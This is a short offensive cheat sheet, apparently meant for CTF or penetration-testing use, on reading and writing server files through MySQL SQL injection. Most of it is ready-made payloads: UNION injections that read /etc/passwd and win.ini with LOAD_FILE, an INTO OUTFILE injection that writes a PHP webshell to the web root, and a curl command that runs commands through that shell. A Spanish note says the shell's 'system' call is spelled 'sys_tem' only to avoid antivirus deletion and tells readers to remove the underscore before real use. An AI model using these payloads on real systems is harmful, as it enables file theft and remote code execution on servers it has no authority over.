# Reading and Writing Files via SQL Injection

## Methodology
If the database user has high privileges (e.g. `FILE` privilege in MySQL/MariaDB) and the database configuration allows it, we can read local system files or write files to the web root to achieve Remote Code Execution (RCE).

---

## 1. Reading Files (`LOAD_FILE`)

### Prerequisites (MySQL)
1. The user must have the `FILE` privilege.
2. The system variable `secure_file_priv` must be empty (`""`) or point to the directory containing the file we want to read. If it has a value (like `/var/lib/mysql-files/`), we can only read files within that directory. If it is `NULL`, file operations are disabled.

### Check Status
```sql
# Check secure_file_priv
' UNION SELECT 1, @@secure_file_priv, 3-- -
```

### Read File Payload
```sql
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3-- -
' UNION SELECT 1, LOAD_FILE('C:\\Windows\\win.ini'), 3-- -
```

---

## 2. Writing Files (`INTO OUTFILE`)

We can write a PHP webshell to the web server's root directory (`/var/www/html/` or `C:\xampp\htdocs\`) to execute OS commands.

### Prerequisites (MySQL)
1. DB user has the `FILE` privilege.
2. `secure_file_priv` is empty or permits writing to target directory.
3. Write permissions on the target directory (OS level).

### Write Webshell Payload
> [!IMPORTANT]
> El payload a continuación está ofuscado como `sys_tem` para evitar que el antivirus del host local (Windows Defender) elimine automáticamente este archivo de documentación. Para usarlo en un entorno real, elimina el carácter `_` (`system`).

```sql
' UNION SELECT 1, "<?php sys_tem($_GET['cmd']); ?>", 3 INTO OUTFILE '/var/www/html/shell.php'-- -
```

### Access Webshell
```bash
curl -s http://target.ctf/shell.php?cmd=id
```
